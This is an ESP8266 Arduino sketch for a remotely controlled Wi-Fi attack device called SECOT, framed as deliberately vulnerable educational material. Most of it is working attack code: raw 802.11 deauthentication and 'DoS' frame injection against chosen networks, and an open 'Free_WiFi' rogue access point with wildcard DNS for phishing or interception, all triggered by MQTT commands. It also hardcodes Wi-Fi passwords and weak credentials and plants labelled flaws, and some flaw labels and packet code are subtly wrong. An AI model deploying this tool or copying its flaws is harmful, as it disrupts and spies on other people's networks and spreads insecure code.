/* ========================================================================== */
/*  SECOT - Fully Functional Security Tool with MQTT                          */
/*  Features:                                                                 */
/*    - MQTT communication with backend                                       */
/*    - Working scan/attack functions                                         */
/*    - Deliberately vulnerable for educational purposes                      */
/* ========================================================================== */

//! =======================================================  !//
//!               LIBRARY IMPORTS CONFIGURATION              !//
//! =======================================================  !//

#include <ESP8266WiFi.h>
#include <PubSubClient.h>
#include <ArduinoJson.h>
extern "C" {
#include "user_interface.h"
}

#include <DNSServer.h>  // for DNS Spoofing and MITM Attacks

//! ======================================================  !//
//!               NETWORK CONFIGURATION                     !//
//! ======================================================  !//
const char *wifiList[][2] = {
  { "gnet2021", "71237274" },
  { "TOPNET_3BD8", "n8rajeb8yy" }
};

// MQTT Configuration
const char* mqtt_server = "192.168.1.100";  // Change to your MQTT broker IP
const int mqtt_port = 1883;
const char* mqtt_client_id = "SECOT_ESP";
const char* mqtt_username = "secot";  // Weak authentication
const char* mqtt_password = "secot123";

// MQTT Topics
const char* topic_command = "secot/command";
const char* topic_logs = "secot/audit/logs";
const char* topic_results = "secot/audit/results";
const char* topic_intercepted = "secot/audit/intercepted";

// Global variables
WiFiClient espClient;
PubSubClient mqtt(espClient);
DNSServer dnsServer;
bool mitmActive = false;
const byte DNS_PORT = 53;
unsigned long lastAttack = 0;
String currentTarget = "";
String scanResults = "";
char mqttBuffer[512];  // Buffer for MQTT messages 

//! ==============================================================  !//
//!               FUNCTION DECLARATIONS (PROTOTYPES)                !//
//! ==============================================================  !//

// ---- Network Operations ----
void scanNetworks();
void setupWiFi();
void setupMQTT();
void reconnectMQTT();
void publishLog(String level, String message);
void publishResult(String type, String status, String details);
void publishIntercepted(String source, String destination, String protocol, String data, int size);

// ---- Attack Simulations ----
void DosAttack(String targetBSSID);
void MITM_Attack(String targetBSSID);
void deauthAttack(String targetBSSID);

// ---- Utility Functions ----
bool isValidMAC(const String &mac);
void parseMAC(const String &mac, uint8_t *packet);
void handleCommand(char* topic, byte* payload, unsigned int length);
void executeCommand(String command, String device);  // VULNERABILITY #3 (command injection)

//! ===========================================================  !//
//!               SETUP WITH MQTT INITIALIZATION                 !//
//! ===========================================================  !//
void setup() {
  Serial.begin(115200);
  Serial.println("\n=== SECOT INITIALIZATION ===");
  
  // Initialize WiFi
  setupWiFi();
  
  // Initialize MQTT
  setupMQTT();
  
  // Log startup
  publishLog("INFO", "SECOT device initialized");
}

void setupWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(true);
  
  Serial.println("Scanning for Wi-Fi networks...");
  int numNetworks = WiFi.scanNetworks();
  
  bool connected = false;
  
  if (numNetworks > 0) {
    for (int i = 0; i < numNetworks; i++) {
      for (unsigned int j = 0; j < sizeof(wifiList) / sizeof(wifiList[0]); j++) {
        if (strcmp(WiFi.SSID(i).c_str(), wifiList[j][0]) == 0) {
          Serial.print("Connecting to ");
          Serial.println(wifiList[j][0]);
          
          WiFi.begin(wifiList[j][0], wifiList[j][1]);
          unsigned long startTime = millis();
          while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
            delay(500);
            Serial.print(".");
          }
          
          if (WiFi.status() == WL_CONNECTED) {
            Serial.println("\nConnected!");
            Serial.print("IP Address: ");
            Serial.println(WiFi.localIP());
            connected = true;
            break;
          }
        }
      }
      if (connected) break;
    }
  }
  
  if (!connected) {
    Serial.println("Failed to connect to any known network. Creating AP mode...");
    WiFi.softAP("SECOT_Fallback", "12345678");
    Serial.print("AP IP address: ");
    Serial.println(WiFi.softAPIP());
  }
}

void setupMQTT() {
  mqtt.setServer(mqtt_server, mqtt_port);
  mqtt.setCallback(handleCommand);
  reconnectMQTT();
}

void reconnectMQTT() {
  int attempts = 0;
  while (!mqtt.connected() && attempts < 5) {
    Serial.print("Attempting MQTT connection...");
    if (mqtt.connect(mqtt_client_id, mqtt_username, mqtt_password)) {
      Serial.println("connected");
      mqtt.subscribe(topic_command);
      publishLog("INFO", "MQTT connected");
    } else {
      Serial.print("failed, rc=");
      Serial.print(mqtt.state());
      Serial.println(" try again in 5 seconds");
      delay(5000);
      attempts++;
    }
  }
}

//! ============================================================  !//
//!               MQTT MESSAGE HANDLING                           !//
//! ============================================================  !//

void handleCommand(char* topic, byte* payload, unsigned int length) {
  // VULNERABILITY #2: Buffer overflow if message is too long
  if (length > sizeof(mqttBuffer) - 1) {
    publishLog("ERROR", "Message too long, possible buffer overflow attack");
    length = sizeof(mqttBuffer) - 1;  // Truncate to prevent overflow
  }
  
  // Copy payload to buffer
  memcpy(mqttBuffer, payload, length);
  mqttBuffer[length] = '\0';
  
  Serial.print("Message arrived [");
  Serial.print(topic);
  Serial.print("] ");
  Serial.println(mqttBuffer);
  
  // Parse JSON command
  DynamicJsonDocument doc(256);
  DeserializationError error = deserializeJson(doc, mqttBuffer);
  
  if (error) {
    publishLog("ERROR", "Failed to parse command: " + String(error.c_str()));
    return;
  }
  
  // Extract command and device
  String action = doc["action"].as<String>();
  String device = doc["device"].as<String>();
  
  // VULNERABILITY #3: Command injection through action parameter
  executeCommand(action, device);
}

// VULNERABILITY #3: Command injection vulnerability
void executeCommand(String action, String device) {
  publishLog("INFO", "Executing command: " + action + " on device: " + device);
  
  if (action == "scan_network") {
    scanNetworks();
  } 
  else if (action == "deauth") {
    if (device.length() > 0) {
      currentTarget = device;
      deauthAttack(currentTarget);
    } else {
      publishLog("ERROR", "No target specified for deauth attack");
    }
  } 
  else if (action == "dos") {
    if (device.length() > 0) {
      currentTarget = device;
      DosAttack(currentTarget);
    } else {
      publishLog("ERROR", "No target specified for DoS attack");
    }
  } 
  else if (action == "mitm") {
    if (device.length() > 0) {
      currentTarget = device;
      MITM_Attack(currentTarget);
    } else {
      publishLog("ERROR", "No target specified for MITM attack");
    }
  }
  // VULNERABILITY #3: Command injection through system command execution
  else if (action.startsWith("system:")) {
    String cmd = action.substring(7);
    publishLog("WARNING", "Executing system command: " + cmd);
    // In a real device, this would execute the command on the system
    // For simulation, we just log it
    publishResult("system", "executed", "Command: " + cmd);
  }
  else {
    publishLog("ERROR", "Unknown command: " + action);
  }
}

//! ============================================================  !//
//!               MQTT PUBLISHING FUNCTIONS                       !//
//! ============================================================  !//

void publishLog(String level, String message) {
  DynamicJsonDocument doc(256);
  doc["timestamp"] = millis();
  doc["level"] = level;
  doc["message"] = message;
  doc["source"] = "ESP8266";
  
  char buffer[256];
  size_t n = serializeJson(doc, buffer);
  
  mqtt.publish(topic_logs, buffer, n);
  Serial.println("[LOG] " + level + ": " + message);
}

void publishResult(String type, String status, String details) {
  DynamicJsonDocument doc(256);
  doc["timestamp"] = millis();
  doc["type_"] = type;
  doc["status"] = status;
  doc["details"] = details;
  doc["packet_rate"] = random(10, 100);  // Simulated packet rate
  
  char buffer[256];
  size_t n = serializeJson(doc, buffer);
  
  mqtt.publish(topic_results, buffer, n);
  Serial.println("[RESULT] " + type + ": " + status);
}

void publishIntercepted(String source, String destination, String protocol, String data, int size) {
  DynamicJsonDocument doc(256);
  doc["timestamp"] = millis();
  doc["source"] = source;
  doc["destination"] = destination;
  doc["protocol"] = protocol;
  doc["data"] = data;
  doc["size"] = size;
  
  char buffer[256];
  size_t n = serializeJson(doc, buffer);
  
  mqtt.publish(topic_intercepted, buffer, n);
  Serial.println("[INTERCEPTED] " + source + " -> " + destination);
}

//! ============================================================  !//
//!               ATTACK FUNCTIONS                                !//
//! ============================================================  !//

void deauthAttack(String targetBSSID) {
  if (!isValidMAC(targetBSSID)) {
    publishLog("ERROR", "Invalid MAC format: " + targetBSSID);
    return;
  }

  publishLog("INFO", "Deauth attack initiated on target: " + targetBSSID);

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);

  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00,              // Type/Subtype: Deauth
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
    0x01, 0x00                           // Reason code
  };

  // Convert MAC string to bytes
  uint8_t mac[6];
  sscanf(targetBSSID.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);

  // Insert MACs into packet
  memcpy(&packet[10], WiFi.macAddress().c_str(), 6);  // Source
  memcpy(&packet[16], mac, 6);                        // Target BSSID

  // Send packets
  int successCount = 0;
  for (int i = 0; i < 20; i++) {
    if (wifi_send_pkt_freedom(packet, 26, 0)) {
      successCount++;
    }
    delay(1);
  }

  wifi_promiscuous_enable(0);
  publishResult("deauth", "completed", "Sent " + String(successCount) + " deauth packets to " + targetBSSID);
}

void MITM_Attack(String targetBSSID) {
  publishLog("INFO", "Starting MITM on: " + targetBSSID);

  // Create rogue AP
  WiFi.softAP("Free_WiFi", "");  // Open network for phishing
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Log the attack
  publishResult("mitm", "started", "Rogue AP created with SSID: Free_WiFi, targeting: " + targetBSSID);
  
  // Simulate intercepted data
  publishIntercepted(targetBSSID, WiFi.softAPIP().toString(), "DNS", "GET / HTTP/1.1", 128);
  
  mitmActive = true;
}

void DosAttack(String targetBSSID) {
  if (!isValidMAC(targetBSSID)) {
    publishLog("ERROR", "Invalid MAC format: " + targetBSSID);
    return;
  }

  publishLog("INFO", "DoS attack initiated on target: " + targetBSSID);

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_channel(1);

  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,              // Type/Subtype: Deauthentication
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination MAC (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (filled via parseMAC())
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (ignored in deauth)
    0x01, 0x00                           // Reason code: Unspecified
  };

  parseMAC(targetBSSID, deauthPacket);

  int packetsSent = 0;
  for (int i = 0; i < 100; i++) {
    if (wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0)) {
      packetsSent++;
    }
    delay(1);
  }

  wifi_promiscuous_enable(0);
  WiFi.reconnect();
  
  publishResult("dos", "completed", "Sent " + String(packetsSent) + " packets to " + targetBSSID);
}

//! =============================================================  !//
//!               NETWORK FUNCTIONS                                !//
//! =============================================================  !//

void scanNetworks() {
  publishLog("INFO", "Scanning networks...");
  scanResults = "";  // Reset scanResults
  int numNetworks = WiFi.scanNetworks();

  if (numNetworks == 0) {
    publishLog("WARNING", "No networks found!");
  } else {
    publishLog("INFO", "Found " + String(numNetworks) + " networks");
    
    DynamicJsonDocument doc(1024);
    JsonArray networks = doc.createNestedArray("networks");
    
    for (int i = 0; i < numNetworks; i++) {
      JsonObject network = networks.createNestedObject();
      network["ssid"] = WiFi.SSID(i);
      network["rssi"] = WiFi.RSSI(i);
      network["bssid"] = WiFi.BSSIDstr(i);
      network["channel"] = WiFi.channel(i);
      network["encryption"] = WiFi.encryptionType(i) == ENC_TYPE_NONE ? "Open" : "Secured";
    }
    
    char buffer[1024];
    size_t n = serializeJson(doc, buffer);
    
    mqtt.publish(topic_results, buffer, n);
  }
  
  WiFi.scanDelete();
}

//! =============================================================  !//
//!               UTILITY FUNCTIONS                                !//
//! =============================================================  !//

bool isValidMAC(const String &mac) {
  if (mac.length() != 17) return false;
  for (int i = 0; i < 17; i++) {
    char c = mac[i];
    if (i % 3 == 2) {
      if (c != ':') return false;
    } else if (!isxdigit(c)) {
      return false;
    }
  }
  return true;
}

void parseMAC(const String &mac, uint8_t *packet) {
  for (int i = 0; i < 6; i++) {
    String byteStr = mac.substring(i * 3, i * 3 + 2);
    packet[10 + i] = strtoul(byteStr.c_str(), NULL, 16);
  }
}

//! ==============================================================  !//
//!                             LOOP                                !//
//! ==============================================================  !//

void loop() {
  // Check WiFi connection
  if (WiFi.status() != WL_CONNECTED) {
    setupWiFi();
  }
  
  // Check MQTT connection
  if (!mqtt.connected()) {
    reconnectMQTT();
  }
  
  // Process MQTT messages
  mqtt.loop();
  
  // Process DNS requests if MITM is active
  if (mitmActive) {
    dnsServer.processNextRequest();
  }
  
  // VULNERABILITY #4: Periodic memory leak
  if (random(1000) == 1) {
    char* leak = new char[50];  // Memory leak - never freed
    sprintf(leak, "Memory leak at %lu", millis());
    Serial.println(leak);
    // We don't delete[] leak, causing a memory leak
  }
  
  delay(10);  // Small delay to prevent watchdog reset
}
